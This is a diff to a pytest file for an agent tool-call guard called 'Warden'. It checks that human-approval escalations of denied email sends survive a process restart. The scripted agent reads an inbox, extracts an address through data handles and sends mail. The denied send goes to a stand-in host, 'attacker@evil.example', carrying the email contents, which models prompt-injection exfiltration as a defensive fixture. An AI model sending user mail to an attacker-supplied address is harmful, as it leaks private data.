@@ -17,7 +17,7 @@ ToolMessage the model sees -- every labeled result is a ``<warden-handle:`` toke
 
 from __future__ import annotations
 
-from typing import Annotated, Any, TypedDict
+from typing import Annotated, Any, Literal, TypedDict
 
 import pytest
 
@@ -576,12 +576,16 @@ def test_two_sequential_interrupts_in_one_node_stay_counter_aligned() -> None:
 
 
 def _restartable(
-    script: list[AIMessage], checkpointer: Any, store: Any
+    script: list[AIMessage],
+    checkpointer: Any,
+    store: Any,
+    *,
+    on_denial: Literal["error", "interrupt"] = "error",
 ) -> tuple[Any, list[tuple[str, str]]]:
     """One 'process': fresh guard/tools/node/graph over the shared infrastructure."""
     guard = Guard(_POLICY)
     outbox: list[tuple[str, str]] = []
-    node = WardenToolNode(guard, _wire(guard, outbox))
+    node = WardenToolNode(guard, _wire(guard, outbox), on_denial=on_denial)
     return _build_graph(node, script, checkpointer=checkpointer, store=store), outbox
 
 
@@ -710,3 +714,96 @@ def test_without_a_store_a_restart_degrades_tokens_to_bottom_literals() -> None:
     result = second.invoke({"messages": [HumanMessage(content="Continue.")]}, config=config)
     contents = _tool_contents(result["messages"])
     assert not contents[-1].startswith(_HANDLE_PREFIX)
+
+
+# --- surviving a process restart (store-backed escalation memo) -----------------
+
+
+def test_an_in_flight_escalation_is_approved_from_a_fresh_process() -> None:
+    # A turn with one ALLOWED and one DENIED send pauses on the denial after the
+    # allowed body already ran; the process then dies mid-escalation. Delivering
+    # the approval from a FRESH process must (a) not re-run the allowed body --
+    # its memo entry was written through before the pause -- and (b) resolve the
+    # denied call's tokens through the restored bindings, declassify, and send.
+    script = [
+        _call("read_inbox", {}, "c0"),
+        _call("extract_address", {"text": f"{_HANDLE_PREFIX}0>"}, "c1"),
+        _multi_call(
+            [
+                ("send_email", {"recipient": "manager@corp.example", "body": "hi"}, "a"),
+                (
+                    "send_email",
+                    {"recipient": f"{_HANDLE_PREFIX}1>", "body": f"{_HANDLE_PREFIX}0>"},
+                    "b",
+                ),
+            ]
+        ),
+        AIMessage(content="done"),
+    ]
+    checkpointer, store = InMemorySaver(), InMemoryStore()
+    config = {"configurable": {"thread_id": "restart-escalation"}}
+
+    first, outbox_1 = _restartable(script, checkpointer, store, on_denial="interrupt")
+    paused = first.invoke(
+        {"messages": [HumanMessage(content="Forward my email.")]}, config=config
+    )
+    assert "__interrupt__" in paused
+    assert outbox_1 == [("manager@corp.example", "hi")]
+
+    second, outbox_2 = _restartable(script, checkpointer, store, on_denial="interrupt")
+    result = second.invoke(Command(resume=True), config=config)
+    # Exactly-once across the restart: the fresh process ran ONLY the approved
+    # send; the manager mail from before the pause was not re-executed.
+    assert outbox_2 == [("attacker@evil.example", _EMAIL)]
+    assert "__interrupt__" not in result
+    assert isinstance(result["messages"][-1], AIMessage)
+
+
+def test_two_escalations_stay_counter_aligned_across_a_restart() -> None:
+    # The cross-process version of the positional-counter invariant: the first
+    # escalation is approved in process one (its body runs there), the process
+    # dies paused on the second. Process two must re-issue the first call's
+    # interrupt from the hydrated memo -- consuming the checkpointed approval,
+    # holding position 0, WITHOUT re-running the body -- then approve the second.
+    script = [
+        _call("read_inbox", {}, "c0"),
+        _call("extract_address", {"text": f"{_HANDLE_PREFIX}0>"}, "c1"),
+        _multi_call(
+            [
+                ("send_email", {"recipient": f"{_HANDLE_PREFIX}1>", "body": "first"}, "b1"),
+                ("send_email", {"recipient": f"{_HANDLE_PREFIX}1>", "body": "second"}, "b2"),
+            ]
+        ),
+        AIMessage(content="done"),
+    ]
+    checkpointer, store = InMemorySaver(), InMemoryStore()
+    config = {"configurable": {"thread_id": "restart-two-escalations"}}
+
+    first, outbox_1 = _restartable(script, checkpointer, store, on_denial="interrupt")
+    first.invoke({"messages": [HumanMessage(content="Forward twice.")]}, config=config)
+    paused = first.invoke(Command(resume=True), config=config)
+    assert "__interrupt__" in paused  # first approved, paused on the second
+    assert [body for _, body in outbox_1] == ["first"]
+
+    second, outbox_2 = _restartable(script, checkpointer, store, on_denial="interrupt")
+    result = second.invoke(Command(resume=True), config=config)
+    assert [body for _, body in outbox_2] == ["second"]  # first NOT re-run
+    assert "__interrupt__" not in result
+    assert isinstance(result["messages"][-1], AIMessage)
+
+
+def test_the_memo_namespace_is_cleared_when_the_super_step_completes() -> None:
+    # The memo is a crash artifact, not a cache: once the super-step completes its
+    # entries must leave the store, or a LATER restart of the thread would replay
+    # stale messages for fresh tool_call_ids that happen to collide.
+    script = [
+        _call("send_email", {"recipient": "manager@corp.example", "body": "hi"}, "c0"),
+        AIMessage(content="done"),
+    ]
+    checkpointer, store = InMemorySaver(), InMemoryStore()
+    config = {"configurable": {"thread_id": "restart-memo-clear"}}
+
+    app, outbox = _restartable(script, checkpointer, store, on_denial="interrupt")
+    app.invoke({"messages": [HumanMessage(content="Mail my manager.")]}, config=config)
+    assert outbox == [("manager@corp.example", "hi")]
+    assert store.search(("warden", "restart-memo-clear", "memo")) == []
